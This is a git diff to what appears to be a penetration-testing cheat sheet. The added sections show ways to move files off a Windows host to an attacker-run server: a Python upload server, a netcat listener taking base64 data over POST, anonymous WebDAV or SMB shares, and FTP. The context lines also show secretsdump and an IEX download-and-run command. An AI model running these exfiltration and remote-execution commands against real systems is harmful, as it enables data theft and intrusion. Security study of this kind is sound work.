@@ -417,7 +417,7 @@ secretsdump.py <domain>/<user>:<password>@<IP>
   (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<file>', '<file>')
   ```
 
-### Windows File Uploads
+### Windows File Uploads with python
   1. start a python upload server
   ```sh
   python3 -m uploadserver
@@ -426,7 +426,52 @@ secretsdump.py <domain>/<user>:<password>@<IP>
   ```powershell
   IEX(New-Object Net.WebClient).DownloadString('<path to PSUpload.ps1>')
   ```
-  3.
+  3. Transfer the file to the upload server
+  ```powershell
+  Invoke-FileUpload -Uri http://<IP>:8000/-File <file upload>
+  ```
+  
+### Windows File Uploads with netcat in with Base64
+  1. start the netcat listener
+  ```sh
+  nc -lvnp 8000
+  ```
+  2. Use powershell to encode the file and upload it
+  ```sh
+  $b64 = [System.convert]::ToBase64String((Get-Content -Path '<path to file>' -Encoding Byte))
+  Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64
+  ```
+  3. decode the post request
+  ```sh
+  echo <base64> | base64 -d -w 0 > hosts
+  ``` 
+  
+### Windows File Uploads with SMB Uploads
+  1. Start the WebDav Python Module
+  ```sh
+  wsgidav --host=0.0.0.0 --port=80 --root=<path/to/directory> --auth=anonymous 
+  ```
+  2. Connect to the WebDav Server
+  ```cmd
+  dir \\192.168.49.128\DavWWWRoot
+  ```
+  3. Upload files
+  ```cmd
+  copy <path/to/file> \\<IP>\DavWWWRoot\
+  ```
+  ```cmd
+  copy <path/to/file> \\<IP>\<share folder>\
+  ```
+  
+### Windows File Uploads with FTP 
+  1. Start ftp server
+  ```sh
+  python3 -m pyftpdlib --port 21 --write
+  ```
+  2. Upload files with Powershell
+  ```powershell
+  (New-Object Net.WebClient).UploadFile('ftp://<ip>', '<File to upload>')
+  ```
   
 #### LOLBAS
 ##### Bitsadmin from Powershell
